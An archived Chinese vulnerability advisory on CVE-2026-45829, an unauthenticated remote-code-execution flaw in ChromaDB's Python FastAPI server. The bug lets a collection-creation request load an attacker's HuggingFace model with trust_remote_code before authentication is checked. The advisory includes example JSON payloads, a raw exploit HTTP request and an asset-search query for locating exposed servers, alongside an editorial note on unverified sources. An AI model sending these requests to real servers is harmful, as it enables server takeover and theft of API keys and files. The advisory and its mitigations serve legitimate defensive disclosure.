---
source: "gelusus/wxvl 公众号漏洞文库"
cve: "CVE-2026-45829"
identifier_role: "primary"
primary_identifiers: "CVE-2026-45829"
referenced_identifiers: ""
identifier_status: "unknown"
title: "CVSS 10.0 【严重】CVE-2026-45829 ChromaDB 爆出未授权 RCE：ChromaToast 横扫 AI 基础设施"
product: "ChromaDB Python FastAPI server"
record_type: "advisory"
document_type: "漏洞通告与示意请求"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "文称>=1.0.0截至1.5.8未修；Python前端模型加载路径，Rust前端差异需验证"
side_effects: "原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96%E8%BD%AF%E4%BB%B6/%E6%9D%82%E9%A1%B9/CVSS%2010.0.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "missing"
source_note: "原始出处待补；仓库归档不等同原始披露"
id: "vw-02fb39ec316bf3cef5d1ea63"
entity_id: "ve-02fb39ec316bf3cef5d1ea63"
schema_version: "1"
---

#  CVSS 10.0 【严重】CVE-2026-45829 ChromaDB 爆出未授权 RCE：ChromaToast 横扫 AI 基础设施  

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：ChromaDB Python FastAPI server
- 文献类型：漏洞通告与示意请求
- 版本、权限及部署边界：文称>=1.0.0截至1.5.8未修；Python前端模型加载路径，Rust前端差异需验证
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. 只有攻击叙述没有HiddenLayer/厂商/原研究链接，真实调用链、schema及鉴权顺序尚待核验
2. EXP地址为作者本机/opt/aikunsec路径，无法取得；恶意模型占位名不构成完整复现
3. 嵌套Markdown围栏错乱，JSON标python，请求头正文缺空行；修复排版
4. 4500搜索结果不能直接计可利用资产；将截至文章日期的未修状态时间化，不扩大到所有ChromaDB/Rust部署

### 操作风险

原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原始披露 URL 未确认；既有归档来源标签保留，不能替代原始公告

### 归档技术正文

原创 chicken
                    chicken  爱坤sec   2026-05-22 18:30  
  
# 一 漏洞描述  
  
ChromaDB 开源向量数据库 Python FastAPI 服务器存在严重设计缺陷——**未授权攻击者可在鉴权之前触发 HuggingFace 模型加载并执行任意代码**。该漏洞由 HiddenLayer 发现并命名为 ChromaToast，获得 CVSS 10.0 满分评分。利用无需任何凭据，仅需向 `/api/v2/tenants/{tenant}/databases/{db}/collections` 端点发送特制请求，即可完全接管服务器，窃取 API 密钥、环境变量及磁盘文件。  
  
CVSS 评分 10.0  
# 二 影响版本  
```
Chromadb >= 1.0.0 （截至最新版 1.5.8 仍未修复）
```  
  
# 三 搜索语法  
```
app="Chroma-ChromaDB"
```  
  
  
四 影响范围  
  
资产大约4500个  
  
![](https://mmbiz.qpic.cn/mmbiz_png/uqtLGQlJSxXXI2r8J2P1LVsVvib4n1ssyBn7hIo9cicH6Qrn3h9s0EaSferGKIEq4oaDMiafLVaf9RIAUe9ibBMQmibWicNg5wgk5cnGR22A4C7icI/640?wx_fmt=png&from=appmsg "")  
  
五 漏洞利用  

**【根因】** 两个独立缺陷叠加：
1. 服务器无条件信任客户端提交的模型标识符（`model_name`），未做任何校验
2. 模型加载在**鉴权之前**执行，鉴权检查形同虚设
**【调用链】** `POST /api/v2/tenants/{tenant}/databases/{db}/collections` → 解析请求体中的 `kwargs` → 提取 `model_name` + `trust_remote_code: true` → 调用 `AutoModel.from_pretrained()` → 从 HuggingFace 下载恶意模型 → **执行远程代码** → 返回 HTTP 500（已无意义）
```python
# 核心攻击载荷
{
  "name": "exploit_collection",
  "metadata": {},
  "configuration": {
    "embedding_function": "HuggingFaceEmbeddingFunction",
    "model_name": "attacker/malicious-model",
    "kwargs": {
      "trust_remote_code": true
    }
  }
}
```
服务端处理流程：**接受请求 → 下载模型 → 执行代码 → 鉴权检查 → 拒绝请求**。攻击者已在第 3 步获得 Shell。
**【EXP 存放位置】** 服务器本地目录 `/opt/aikunsec/CVE-2026-45829/exploit.py`
```
POST /api/v2/tenants/default_tenant/databases/default_database/collections HTTP/1.1
Host: target:8000
Content-Type: application/json
{
  "name": "pwn",
  "configuration": {
    "embedding_function": "HuggingFaceEmbeddingFunction",
    "model_name": "your-hf-username/pwn-model",
    "kwargs": {"trust_remote_code": true}
  }
}
```
HiddenLayer 于 2026 年 2 月 17 日向 ChromaDB 报告，独立研究员 Azraelxuemo 更早在 2025 年 11 月报告，均未获回应。截至 ChromaDB 1.5.8 **仍未修复**。

  
临时缓解：限制网络访问、禁止暴露 Python FastAPI 端口到公网、使用 Rust 前端替代。  
  
【严重声明】本文所涉及的工具、思路和操作手法仅用于本地安全测试以及教育目的，禁止将其用于非法入侵或对他人的系统进行攻击以及盈利，一切后果由操作者自行承担！！！下载后的24小时请删除。  
  
更多精彩文章与工具分享 欢迎关注  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原始披露 URL 尚未确认，现有链接按来源追溯区分别标注）
